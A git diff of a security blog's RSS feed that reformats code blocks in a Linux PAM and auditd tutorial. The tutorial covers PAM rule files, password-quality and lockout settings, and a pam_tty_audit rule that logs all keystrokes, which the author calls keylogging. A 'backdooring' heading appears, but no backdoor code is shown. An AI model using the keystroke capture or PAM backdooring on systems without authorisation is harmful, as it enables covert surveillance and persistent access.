@@ -6,7 +6,7 @@
     <description>Recent content in Security on Connected</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 27 Dec 2022 23:25:23 +0530</lastBuildDate>
+    <lastBuildDate>Tue, 02 Apr 2024 17:19:43 +0530</lastBuildDate>
     <atom:link href="https://ayedaemon.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Pluggable Authentication Modules - Linux</title>
@@ -641,105 +641,105 @@ The complete list of return codes and their meanings can be found in their githu
 <h2 id="configuring-pam">Configuring PAM</h2>
 <p>PAM&rsquo;s main feature is the module configuration it offers. PAM looks at these text configuration files to determine what security actions to take for an application, and the administrator can add or remove new rules at any time. PAM is also extensible, which means that if we want to add new features (such as 2FA/MFA), we only need to change a few files and <code>login</code> can now use them.</p>
 <p>In RedHat based systems, all of the pam config files can be easily located with the below command.</p>
-<pre tabindex="0"><code>$ rpm -ql pam | grep /etc
-
-/etc/pam.d
-/etc/pam.d/config-util
-/etc/pam.d/fingerprint-auth
-/etc/pam.d/other
-/etc/pam.d/password-auth
-/etc/pam.d/postlogin
-/etc/pam.d/smartcard-auth
-/etc/pam.d/system-auth
-/etc/security
-/etc/security/access.conf
-/etc/security/chroot.conf
-/etc/security/console.apps
-/etc/security/console.handlers
-/etc/security/console.perms
-/etc/security/console.perms.d
-/etc/security/group.conf
-/etc/security/limits.conf
-/etc/security/limits.d
-/etc/security/limits.d/20-nproc.conf
-/etc/security/namespace.conf
-/etc/security/namespace.d
-/etc/security/namespace.init
-/etc/security/opasswd
-/etc/security/pam_env.conf
-/etc/security/sepermit.conf
-/etc/security/time.conf
-</code></pre><p>There are two main directories here: <code>/etc/pam.d</code> and <code>/etc/security</code>. Both of these directories play important roles in configuring PAM behaviour.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ rpm -ql pam | grep /etc
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/etc/pam.d
+</span></span><span class="line"><span class="cl">/etc/pam.d/config-util
+</span></span><span class="line"><span class="cl">/etc/pam.d/fingerprint-auth
+</span></span><span class="line"><span class="cl">/etc/pam.d/other
+</span></span><span class="line"><span class="cl">/etc/pam.d/password-auth
+</span></span><span class="line"><span class="cl">/etc/pam.d/postlogin
+</span></span><span class="line"><span class="cl">/etc/pam.d/smartcard-auth
+</span></span><span class="line"><span class="cl">/etc/pam.d/system-auth
+</span></span><span class="line"><span class="cl">/etc/security
+</span></span><span class="line"><span class="cl">/etc/security/access.conf
+</span></span><span class="line"><span class="cl">/etc/security/chroot.conf
+</span></span><span class="line"><span class="cl">/etc/security/console.apps
+</span></span><span class="line"><span class="cl">/etc/security/console.handlers
+</span></span><span class="line"><span class="cl">/etc/security/console.perms
+</span></span><span class="line"><span class="cl">/etc/security/console.perms.d
+</span></span><span class="line"><span class="cl">/etc/security/group.conf
+</span></span><span class="line"><span class="cl">/etc/security/limits.conf
+</span></span><span class="line"><span class="cl">/etc/security/limits.d
+</span></span><span class="line"><span class="cl">/etc/security/limits.d/20-nproc.conf
+</span></span><span class="line"><span class="cl">/etc/security/namespace.conf
+</span></span><span class="line"><span class="cl">/etc/security/namespace.d
+</span></span><span class="line"><span class="cl">/etc/security/namespace.init
+</span></span><span class="line"><span class="cl">/etc/security/opasswd
+</span></span><span class="line"><span class="cl">/etc/security/pam_env.conf
+</span></span><span class="line"><span class="cl">/etc/security/sepermit.conf
+</span></span><span class="line"><span class="cl">/etc/security/time.conf
+</span></span></code></pre></div><p>There are two main directories here: <code>/etc/pam.d</code> and <code>/etc/security</code>. Both of these directories play important roles in configuring PAM behaviour.</p>
 <p>Each file in the <code>/etc/pam.d</code> folder contains rules that are read by PAM at runtime. If the user attempts to login via <code>ssh</code>, he must be authenticated. PAM checks rules from the <code>sshd</code> file in the <code>/etc/pam.d/</code> folder after <strong>sshd</strong> sends an authentication request to PAM. If the file is present, the file&rsquo;s rules are read and a proper response is returned to the application. If the file is missing, the default behaviour is to read the rules from <code>other</code> file in same directory and act on them.</p>
 <p>Let&rsquo;s take a look at <code>/etc/pam.d/</code> folder to get better picture of what&rsquo;s in it.</p>
-<pre tabindex="0"><code>$ ls -l /etc/pam.d
-
--rw-r--r--. 1 root root  192 Feb  2  2021 chfn
--rw-r--r--. 1 root root  192 Feb  2  2021 chsh
--rw-r--r--. 1 root root  232 Apr  1  2020 config-util
--rw-r--r--. 1 root root  287 Jan 13  2022 crond
-lrwxrwxrwx. 1 root root   19 Nov 18 13:01 fingerprint-auth -&gt; fingerprint-auth-ac
--rw-r--r--. 1 root root  702 Nov 18 13:01 fingerprint-auth-ac
--rw-r--r--. 1 root root  796 Feb  2  2021 login
--rw-r--r--. 1 root root  154 Apr  1  2020 other
--rw-r--r--. 1 root root  188 Apr  1  2020 passwd
-lrwxrwxrwx. 1 root root   16 Nov 18 13:01 password-auth -&gt; password-auth-ac
--rw-r--r--. 1 root root 1033 Nov 18 13:01 password-auth-ac
--rw-r--r--. 1 root root  155 Jan 25  2022 polkit-1
-lrwxrwxrwx. 1 root root   12 Nov 18 13:01 postlogin -&gt; postlogin-ac
--rw-r--r--. 1 root root  330 Nov 18 13:01 postlogin-ac
--rw-r--r--. 1 root root  681 Feb  2  2021 remote
--rw-r--r--. 1 root root  143 Feb  2  2021 runuser
--rw-r--r--. 1 root root  138 Feb  2  2021 runuser-l
-lrwxrwxrwx. 1 root root   17 Nov 18 13:01 smartcard-auth -&gt; smartcard-auth-ac
--rw-r--r--. 1 root root  752 Nov 18 13:01 smartcard-auth-ac
-lrwxrwxrwx. 1 root root   25 Nov 18 12:57 smtp -&gt; /etc/alternatives/mta-pam
--rw-r--r--. 1 root root   76 Apr  1  2020 smtp.postfix
--rw-r--r--. 1 root root  904 Nov 24  2021 sshd
--rw-r--r--. 1 root root  540 Feb  2  2021 su
--rw-r--r--. 1 root root  200 Oct 14  2021 sudo
--rw-r--r--. 1 root root  178 Oct 14  2021 sudo-i
--rw-r--r--. 1 root root  137 Feb  2  2021 su-l
-lrwxrwxrwx. 1 root root   14 Nov 18 13:01 system-auth -&gt; system-auth-ac
--rw-r--r--. 1 root root 1031 Nov 18 13:01 system-auth-ac
--rw-r--r--. 1 root root  129 Sep  1 14:57 systemd-user
--rw-r--r--. 1 root root   84 Nov 24  2021 vlock
-</code></pre><p>There are more files than what the rpm command above revealed. The reason for this is straightforward: we examined files installed by the <code>pam</code> package itself. Other files are installed by the packages that they belong to. The <code>openssh-server</code> package, for example, installed the <code>sshd</code> file.</p>
-<pre tabindex="0"><code>$ rpm -qf /etc/pam.d/sshd
-
-openssh-server-7.4p1-22.el7_9.x86_64
-</code></pre><p>We now know that pam has rule files for each application as well as a default <code>other</code> file for all applications that do not have dedicated rule files. We won&rsquo;t always need this, but it&rsquo;s a good idea to keep it in the back of our minds.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ls -l /etc/pam.d
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  192 Feb  2  2021 chfn
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  192 Feb  2  2021 chsh
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  232 Apr  1  2020 config-util
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  287 Jan 13  2022 crond
+</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   19 Nov 18 13:01 fingerprint-auth -&gt; fingerprint-auth-ac
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  702 Nov 18 13:01 fingerprint-auth-ac
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  796 Feb  2  2021 login
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  154 Apr  1  2020 other
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  188 Apr  1  2020 passwd
+</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   16 Nov 18 13:01 password-auth -&gt; password-auth-ac
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root 1033 Nov 18 13:01 password-auth-ac
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  155 Jan 25  2022 polkit-1
+</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   12 Nov 18 13:01 postlogin -&gt; postlogin-ac
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  330 Nov 18 13:01 postlogin-ac
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  681 Feb  2  2021 remote
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  143 Feb  2  2021 runuser
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  138 Feb  2  2021 runuser-l
+</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   17 Nov 18 13:01 smartcard-auth -&gt; smartcard-auth-ac
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  752 Nov 18 13:01 smartcard-auth-ac
+</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   25 Nov 18 12:57 smtp -&gt; /etc/alternatives/mta-pam
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root   76 Apr  1  2020 smtp.postfix
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  904 Nov 24  2021 sshd
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  540 Feb  2  2021 su
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  200 Oct 14  2021 sudo
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  178 Oct 14  2021 sudo-i
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  137 Feb  2  2021 su-l
+</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   14 Nov 18 13:01 system-auth -&gt; system-auth-ac
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root 1031 Nov 18 13:01 system-auth-ac
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  129 Sep  1 14:57 systemd-user
+</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root   84 Nov 24  2021 vlock
+</span></span></code></pre></div><p>There are more files than what the rpm command above revealed. The reason for this is straightforward: we examined files installed by the <code>pam</code> package itself. Other files are installed by the packages that they belong to. The <code>openssh-server</code> package, for example, installed the <code>sshd</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ rpm -qf /etc/pam.d/sshd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">openssh-server-7.4p1-22.el7_9.x86_64
+</span></span></code></pre></div><p>We now know that pam has rule files for each application as well as a default <code>other</code> file for all applications that do not have dedicated rule files. We won&rsquo;t always need this, but it&rsquo;s a good idea to keep it in the back of our minds.</p>
 <p>Let&rsquo;s take a closer look at these rules from the <code>sshd</code> file.</p>
-<pre tabindex="0"><code>$ cat /etc/pam.d/sshd
-
-
-#%PAM-1.0
-auth	   required	pam_sepermit.so
-auth       substack     password-auth
-auth       include      postlogin
-# Used with polkit to reauthorize users in remote sessions
--auth      optional     pam_reauthorize.so prepare
-
-account    required     pam_nologin.so
-account    include      password-auth
-
-password   include      password-auth
-# pam_selinux.so close should be the first session rule
-
-session    required     pam_selinux.so close
-session    required     pam_loginuid.so
-# pam_selinux.so open should only be followed by sessions to be executed in the user context
-session    required     pam_selinux.so open env_params
-session    required     pam_namespace.so
-session    optional     pam_keyinit.so force revoke
-session    include      password-auth
-session    include      postlogin
-# Used with polkit to reauthorize users in remote sessions
--session   optional     pam_reauthorize.so prepare
-</code></pre><p>Lines beginning with <code>#</code> are clearly identified as comments, while the rest of the lines contain a single rule in a line.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /etc/pam.d/sshd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#%PAM-1.0
+</span></span><span class="line"><span class="cl">auth	   required	pam_sepermit.so
+</span></span><span class="line"><span class="cl">auth       substack     password-auth
+</span></span><span class="line"><span class="cl">auth       include      postlogin
+</span></span><span class="line"><span class="cl"># Used with polkit to reauthorize users in remote sessions
+</span></span><span class="line"><span class="cl">-auth      optional     pam_reauthorize.so prepare
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">account    required     pam_nologin.so
+</span></span><span class="line"><span class="cl">account    include      password-auth
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">password   include      password-auth
+</span></span><span class="line"><span class="cl"># pam_selinux.so close should be the first session rule
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">session    required     pam_selinux.so close
+</span></span><span class="line"><span class="cl">session    required     pam_loginuid.so
+</span></span><span class="line"><span class="cl"># pam_selinux.so open should only be followed by sessions to be executed in the user context
+</span></span><span class="line"><span class="cl">session    required     pam_selinux.so open env_params
+</span></span><span class="line"><span class="cl">session    required     pam_namespace.so
+</span></span><span class="line"><span class="cl">session    optional     pam_keyinit.so force revoke
+</span></span><span class="line"><span class="cl">session    include      password-auth
+</span></span><span class="line"><span class="cl">session    include      postlogin
+</span></span><span class="line"><span class="cl"># Used with polkit to reauthorize users in remote sessions
+</span></span><span class="line"><span class="cl">-session   optional     pam_reauthorize.so prepare
+</span></span></code></pre></div><p>Lines beginning with <code>#</code> are clearly identified as comments, while the rest of the lines contain a single rule in a line.</p>
 <p>Each rule follows a similar structure but uses different keywords. The generic rule syntax looks like this:</p>
-<pre tabindex="0"><code>type    control    module [modules arguments]
-</code></pre><p>There are 4 types of <code>type</code> in the PAM rules file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">type    control    module [modules arguments]
+</span></span></code></pre></div><p>There are 4 types of <code>type</code> in the PAM rules file.</p>
 <ul>
 <li><strong>auth</strong> : rules for authentication.</li>
 <li><strong>account</strong> : rules for account management, like expired passwords and allowed time of login.</li>
@@ -825,45 +825,45 @@ session    include      postlogin
 <p>Let&rsquo;s apply everything we&rsquo;ve learned so far to observe how PAM responds to password changes made with the <code>passwd</code> utility.</p>
 <p>We now know that the <code>/etc/pam.d/passwd</code> file will be used by passwd (if it exists; else, <code>/etc/pam.d/other</code> will be read). This file will provide the procedures to be followed when sshd is used for any type of <a href="https://www.cloudflare.com/learning/access-management/authn-vs-authz/">authentication and authorization</a>.</p>
 <p>This makes it obvious for us to go and checkout the <code>/etc/pam.d/passwd</code> file&hellip;</p>
-<pre tabindex="0"><code>$ cat /etc/pam.d/passwd
-
-#%PAM-1.0
-auth       include	system-auth
-account    include	system-auth
-password   substack	system-auth
--password   optional	pam_gnome_keyring.so use_authtok
-password   substack	postlogin
-</code></pre><p>Analysing this file let us know that this module <strong>includes</strong> <code>system-auth</code> rules file. So we&rsquo;ll now inspect the rules mentioned in <code>/etc/pam.d/system-auth</code> file.</p>
-<pre tabindex="0"><code>$ cat /etc/pam.d/system-auth
-
-#%PAM-1.0
-# This file is auto-generated.
-# User changes will be destroyed the next time authconfig is run.
-auth        required      pam_env.so
-auth        required      pam_faildelay.so delay=2000000
-auth        sufficient    pam_unix.so nullok try_first_pass
-auth        requisite     pam_succeed_if.so uid &gt;= 1000 quiet_success
-auth        required      pam_deny.so
-
-account     required      pam_unix.so
-account     sufficient    pam_localuser.so
-account     sufficient    pam_succeed_if.so uid &lt; 1000 quiet
-account     required      pam_permit.so
-
-password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
-password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
-password    required      pam_deny.so
-
-session     optional      pam_keyinit.so revoke
-session     required      pam_limits.so
--session     optional      pam_systemd.so
-session     [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid
-session     required      pam_unix.so
-</code></pre><p>Only the <code>password</code> <strong>type</strong> is relevant for our intended task out of all of these rules.</p>
-<pre tabindex="0"><code>password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
-password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
-password    required      pam_deny.so
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /etc/pam.d/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#%PAM-1.0
+</span></span><span class="line"><span class="cl">auth       include	system-auth
+</span></span><span class="line"><span class="cl">account    include	system-auth
+</span></span><span class="line"><span class="cl">password   substack	system-auth
+</span></span><span class="line"><span class="cl">-password   optional	pam_gnome_keyring.so use_authtok
+</span></span><span class="line"><span class="cl">password   substack	postlogin
+</span></span></code></pre></div><p>Analysing this file let us know that this module <strong>includes</strong> <code>system-auth</code> rules file. So we&rsquo;ll now inspect the rules mentioned in <code>/etc/pam.d/system-auth</code> file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /etc/pam.d/system-auth
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#%PAM-1.0
+</span></span><span class="line"><span class="cl"># This file is auto-generated.
+</span></span><span class="line"><span class="cl"># User changes will be destroyed the next time authconfig is run.
+</span></span><span class="line"><span class="cl">auth        required      pam_env.so
+</span></span><span class="line"><span class="cl">auth        required      pam_faildelay.so delay=2000000
+</span></span><span class="line"><span class="cl">auth        sufficient    pam_unix.so nullok try_first_pass
+</span></span><span class="line"><span class="cl">auth        requisite     pam_succeed_if.so uid &gt;= 1000 quiet_success
+</span></span><span class="line"><span class="cl">auth        required      pam_deny.so
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">account     required      pam_unix.so
+</span></span><span class="line"><span class="cl">account     sufficient    pam_localuser.so
+</span></span><span class="line"><span class="cl">account     sufficient    pam_succeed_if.so uid &lt; 1000 quiet
+</span></span><span class="line"><span class="cl">account     required      pam_permit.so
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+</span></span><span class="line"><span class="cl">password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
+</span></span><span class="line"><span class="cl">password    required      pam_deny.so
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">session     optional      pam_keyinit.so revoke
+</span></span><span class="line"><span class="cl">session     required      pam_limits.so
+</span></span><span class="line"><span class="cl">-session     optional      pam_systemd.so
+</span></span><span class="line"><span class="cl">session     [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid
+</span></span><span class="line"><span class="cl">session     required      pam_unix.so
+</span></span></code></pre></div><p>Only the <code>password</code> <strong>type</strong> is relevant for our intended task out of all of these rules.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
+</span></span><span class="line"><span class="cl">password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
+</span></span><span class="line"><span class="cl">password    required      pam_deny.so
+</span></span></code></pre></div><ul>
 <li><code>requisite	pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=</code></li>
 </ul>
 <p>This rule checks the quality of password using some predefined configuration that are mentioned in <code>/etc/security/pwquality.conf</code> or can be explicitely dictated via module arguments. The <code>try_first_pass</code> option tells to load the password from previous rule (if any), else this module will make prompt user for password. <code>local_users_only</code> option will tell <code>pam_pwquality.so</code> module to ignore the users that are not in the <code>/etc/passwd</code> file. <code>retry</code> option is the number of tries a user gets to pick an acceptable password before the module returns an error. By default, the prompt the user gets when entering their password is &ldquo;New password:&rdquo;. If the administrator sets <code>authtok_type=FOO</code>, the prompt becomes &ldquo;New FOO password:&rdquo;. Here the default behaviour will be expected.</p>
@@ -887,10 +887,10 @@ password    required      pam_deny.so
 - enforce the policy for root as well.
 </code></pre>
 <p>&hellip; necessary changes that are needed to make are as below</p>
-<pre tabindex="0"><code>password    requisite     pam_pwquality.so try_first_pass local_users_only retry=2 minlen=12 difok=6 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1 [badwords=qwerty password] enforce_for_root
-password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
-password    required      pam_deny.so
-</code></pre><p>The changes to the <code>system-auth</code> file described above will affect all applications that rely on that rule file. If changes are made to the <code>passwd</code> file, they will only affect the <code>passwd</code> utility.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">password    requisite     pam_pwquality.so try_first_pass local_users_only retry=2 minlen=12 difok=6 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1 [badwords=qwerty password] enforce_for_root
+</span></span><span class="line"><span class="cl">password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
+</span></span><span class="line"><span class="cl">password    required      pam_deny.so
+</span></span></code></pre></div><p>The changes to the <code>system-auth</code> file described above will affect all applications that rely on that rule file. If changes are made to the <code>passwd</code> file, they will only affect the <code>passwd</code> utility.</p>
 <p>We can also use the <code>authconfig</code> utility to make nearly all of these changes without having to interact directly with the associated files.
 More information can be found <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/authconfig-pwd#authconfig-pwd-cmd">here</a> . <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
 <h3 id="lock-out-at-multiple-failed-attempts">lock out at multiple failed attempts</h3>
@@ -898,26 +898,26 @@ More information can be found <a href="https://access.redhat.com/documentation/e
 <p>This is possible with the <code>pam faillock</code> module. Because there is no dedicated config file for this module, all configuration will be done through module arguments. You can either manually edit the rule files with your favourite text editor or use the authconfig utility to make changes.</p>
 <p>Before you begin, you must determine whether or not <code>pam_faillock</code> is enabled.
 This can be verified using</p>
-<pre tabindex="0"><code>authconfig --test | grep pam_faillock
-</code></pre><p>For me the default output was</p>
-<pre tabindex="0"><code>pam_faillock is disabled (deny=4 unlock_time=1200)
-</code></pre><p>So I had to enable it via <code>authconfig --enablefaillock</code> and along with that you can pass module arguments via  <code>authconfig --faillockargs=&lt;module_options&gt;</code> flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">authconfig --test | grep pam_faillock
+</span></span></code></pre></div><p>For me the default output was</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pam_faillock is disabled (deny=4 unlock_time=1200)
+</span></span></code></pre></div><p>So I had to enable it via <code>authconfig --enablefaillock</code> and along with that you can pass module arguments via  <code>authconfig --faillockargs=&lt;module_options&gt;</code> flag.</p>
 <p>Or, one can combine both of the actions in a single command like</p>
-<pre tabindex="0"><code>authconfig --enablefaillock --faillockargs=&#34;fail_interval=30 deny=3 unlock_time=3600&#34; --update
-</code></pre><p>The above command will add <code>pam_faillock</code> rule in all of the relevant rules file (located in <code>/etc/pam.d/</code> directory). And the rest of the commands will configure the behaviour of the <code>pam_faillock</code> module. All of the module options can be checked with <code>man pam_faillock</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">authconfig --enablefaillock --faillockargs=&#34;fail_interval=30 deny=3 unlock_time=3600&#34; --update
+</span></span></code></pre></div><p>The above command will add <code>pam_faillock</code> rule in all of the relevant rules file (located in <code>/etc/pam.d/</code> directory). And the rest of the commands will configure the behaviour of the <code>pam_faillock</code> module. All of the module options can be checked with <code>man pam_faillock</code>.</p>
 <p>Now the output of below command is slight different.</p>
-<pre tabindex="0"><code>authconfig --test | grep pam_faillock
-</code></pre><p>Output:</p>
-<pre tabindex="0"><code>pam_faillock is enabled (fail_interval=30 deny=3 unlock_time=3600)
-</code></pre><p>You can list the failed login attempts with the <code>faillock</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">authconfig --test | grep pam_faillock
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pam_faillock is enabled (fail_interval=30 deny=3 unlock_time=3600)
+</span></span></code></pre></div><p>You can list the failed login attempts with the <code>faillock</code> command.</p>
 <h3 id="tty-auditing--cough--keylogging--cough">TTy auditing ( *cough*  keylogging  *cough*)</h3>
 <p>Audit system (In Redhat or similar linux distros) uses <code>pam_tty_audit</code> PAM module for auditing of TTY input. When user logins, this module logs all keystrokes that user makes to <code>/var/log/audit/audit.log</code> file.</p>
 <p>Since this depends on <code>auditd</code> service and requires that to be configured and running properly.</p>
 <p>There is no <code>authconfig</code> flag that can enable this (atleast, there is none in centos 7.5), so we&rsquo;ll have to follow the traditional way of editing files manually to configure it.</p>
 <p>This module only provides support for <strong>session</strong> type. That means we can only add <strong>session</strong> rules to our required files and it&rsquo;ll take effect immidiately for that service.</p>
 <p>My idea is to add this rule in <code>/etc/pam.d/system-auth</code> and <code>/etc/pam.d/password-auth</code>.</p>
-<pre tabindex="0"><code>session     required    pam_tty_audit.so  enable=*
-</code></pre><p>The above rule will capture all of the tty inputs as it is and store them in <code>/var/log/audit/audit.log</code> file (by default). You can easily <code>grep</code> stuff from that or use a proper tool to query the logs&hellip; like <code>aureport</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">session     required    pam_tty_audit.so  enable=*
+</span></span></code></pre></div><p>The above rule will capture all of the tty inputs as it is and store them in <code>/var/log/audit/audit.log</code> file (by default). You can easily <code>grep</code> stuff from that or use a proper tool to query the logs&hellip; like <code>aureport</code>.</p>
 <p><code>aureport --tty</code> command filters all <code>TYPE=tty</code> logs events from the file and display them in very human readable format.</p>
 <h3 id="backdooring">backdooring</h3>
 <p>Till this point, we have learnt a lot about PAM and it is time to rethink on the basics once again. PAM has 3 components: <strong>user</strong>, <strong>password</strong> and <strong>service</strong>. It&rsquo;s role is to authenticate a <em>user</em> to a <em>service</em> with provided <em>password</em>.</p>
@@ -968,67 +968,67 @@ Anyone concerned about the security, stability, and proper operation of their Li
 Because it operates at the kernel level, it has a lot of visibility over almost everything. The Linux kernel sends significant events to user-space (<code>auditd</code>) so that they can be recorded in a file. This file can then be analysed on the host system or sent to a remote location for storage and analysis.</p>
 <h2 id="user-space-auditd">User-space auditd</h2>
 <p>The majority of Linux distributions come with <code>auditd</code> preinstalled, which begins and stops with the system (as a systemd service file). Using below command, you may determine whether the kernel was built using the audit options.</p>
-<pre tabindex="0"><code>grep -i audit /boot/config-`uname -r`
-</code></pre><p>On my system, it gives me below output (indicating kernel was built with auditing feature)</p>
-<pre tabindex="0"><code>CONFIG_AUDIT_ARCH=y
-CONFIG_AUDIT=y
-CONFIG_AUDITSYSCALL=y
-CONFIG_AUDIT_WATCH=y
-CONFIG_AUDIT_TREE=y
-CONFIG_NETFILTER_XT_TARGET_AUDIT=m
-CONFIG_IMA_AUDIT=y
-CONFIG_KVM_MMU_AUDIT=y
-</code></pre><p>Second thing you would want to check if the kernel thread process responsible for sending data to user-space is running. Check that with the <code>ps</code> command.</p>
-<pre tabindex="0"><code>sudo ps -aux | grep -i kauditd
-</code></pre><p>This gives me below output (indicating that the thread is running)</p>
-<pre tabindex="0"><code>root       103  0.0  0.0      0     0 ?        S    11:39   0:00 [kauditd]
-</code></pre><p>Final thing is to check the user-space service responsible to get the data from <code>kauditd</code>. To obtain definitive indications on systemd systems, use the commands listed below.</p>
-<pre tabindex="0"><code>systemctl is-active auditd          ## Returns: active/inactive
-systemctl is-enabled auditd         ## Returns: enabled/disabled
-</code></pre><p><em>(<strong>Note</strong>: Feel free to check the source code at <a href="https://elixir.bootlin.com/linux/latest/source/kernel/audit.c"><code>kernel/audit.c</code></a>. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>)</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">grep -i audit /boot/config-`uname -r`
+</span></span></code></pre></div><p>On my system, it gives me below output (indicating kernel was built with auditing feature)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CONFIG_AUDIT_ARCH=y
+</span></span><span class="line"><span class="cl">CONFIG_AUDIT=y
+</span></span><span class="line"><span class="cl">CONFIG_AUDITSYSCALL=y
+</span></span><span class="line"><span class="cl">CONFIG_AUDIT_WATCH=y
+</span></span><span class="line"><span class="cl">CONFIG_AUDIT_TREE=y
+</span></span><span class="line"><span class="cl">CONFIG_NETFILTER_XT_TARGET_AUDIT=m
+</span></span><span class="line"><span class="cl">CONFIG_IMA_AUDIT=y
+</span></span><span class="line"><span class="cl">CONFIG_KVM_MMU_AUDIT=y
+</span></span></code></pre></div><p>Second thing you would want to check if the kernel thread process responsible for sending data to user-space is running. Check that with the <code>ps</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo ps -aux | grep -i kauditd
+</span></span></code></pre></div><p>This gives me below output (indicating that the thread is running)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root       103  0.0  0.0      0     0 ?        S    11:39   0:00 [kauditd]
